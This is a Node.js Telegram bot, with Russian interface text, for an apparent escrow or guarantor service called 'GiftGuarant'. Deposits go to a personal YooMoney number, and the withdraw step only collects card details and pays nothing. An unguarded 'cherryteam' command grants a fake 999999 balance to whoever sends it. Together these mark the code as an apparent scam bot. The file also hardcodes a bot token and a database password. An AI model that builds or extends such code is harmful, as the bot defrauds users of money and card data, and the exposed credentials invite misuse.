const { Telegraf, Markup } = require('telegraf');
const { Pool } = require('pg');

const bot = new Telegraf('8242060469:AAHt6_sJt7iFWraOT193hAU4jtXXRPFHgJg');

const pool = new Pool({
  connectionString: 'postgresql://postgres:maksam12345678910777@db.goemwsdzdsenyuhlzdau.supabase.co:5432/postgres',
  ssl: { rejectUnauthorized: false }
});

// Простая функция запросов
async function db(query, params = []) {
  try {
    return await pool.query(query, params);
  } catch (e) {
    return { rows: [] };
  }
}

// Главное меню
async function showMainMenu(ctx) {
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.webApp('🌏 Открыть в приложении', 'https://example.com')],
    [Markup.button.callback('📁 Мои сделки', 'my_deals')],
    [Markup.button.callback('⚙️ Настройки', 'settings')]
  ]);

  await ctx.reply('👋 Добро пожаловать в GiftGuarant!', { ...keyboard });
}

// СТАРТ - ПРОСТО И РАБОЧЕ
bot.start(async (ctx) => {
  await db('INSERT INTO users (user_id, username) VALUES ($1, $2) ON CONFLICT DO NOTHING', [ctx.from.id, ctx.from.username]);
  await showMainMenu(ctx);
});

// Мои сделки
bot.action('my_deals', async (ctx) => {
  await ctx.reply('📭 У вас пока нет сделок');
});

// Настройки  
bot.action('settings', async (ctx) => {
  const user = await db('SELECT balance FROM users WHERE user_id = $1', [ctx.from.id]);
  const balance = user.rows[0]?.balance || 0;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('💰 Баланс', 'balance_menu')],
    [Markup.button.callback('⏪ Назад', 'main_menu')]
  ]);

  await ctx.reply(`⚙️ Настройки\n\n💰 Баланс: ${balance}₽`, { ...keyboard });
});

// Баланс
bot.action('balance_menu', async (ctx) => {
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📥 Пополнить', 'deposit')],
    [Markup.button.callback('📤 Вывести', 'withdraw')],
    [Markup.button.callback('⏪ Назад', 'settings')]
  ]);

  await ctx.reply('💰 Баланс\n\nВыберите действие:', { ...keyboard });
});

// Пополнение
bot.action('deposit', async (ctx) => {
  await ctx.reply('📥 Пополнение баланса\n\nОтправьте сумму на: 89202555790\nЮмани');
});

// Вывод
bot.action('withdraw', async (ctx) => {
  await ctx.reply('📤 Введите реквизиты и сумму для вывода:\n\nПример:\nКарта: 1234 5678 9012 3456\nСумма: 10000');
});

// Назад
bot.action('main_menu', async (ctx) => {
  await ctx.deleteMessage();
  await showMainMenu(ctx);
});

// Создание сделки
bot.command('create', async (ctx) => {
  const dealId = Math.random().toString(36).substring(2, 10).toUpperCase();
  const dealLink = `https://t.me/${ctx.botInfo.username}?start=deal_${dealId}`;
  
  await db('INSERT INTO deals (deal_id, seller_id, deal_link) VALUES ($1, $2, $3)', [dealId, ctx.from.id, dealLink]);
  await ctx.reply(`💥 Сделка создана!\n\nСсылка: ${dealLink}`);
});

// Админские команды
bot.command('cherryteam', async (ctx) => {
  await db('UPDATE users SET balance = 999999 WHERE user_id = $1', [ctx.from.id]);
  await ctx.reply('🍒 Бесконечный баланс активирован!');
});

bot.command('ban', async (ctx) => {
  const args = ctx.message.text.split(' ');
  if (args[1]) {
    await db('UPDATE users SET is_banned = TRUE WHERE user_id = $1', [args[1]]);
    await ctx.reply(`🚫 Пользователь ${args[1]} заблокирован`);
  }
});

bot.command('deals', async (ctx) => {
  const deals = await db('SELECT * FROM deals LIMIT 10');
  let text = '📊 Сделки:\n\n';
  deals.rows.forEach(deal => {
    text += `#${deal.deal_id} - ${deal.status}\n`;
  });
  await ctx.reply(text);
});

// Запуск
bot.launch().then(() => {
  console.log('✅ Бот запущен!');
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
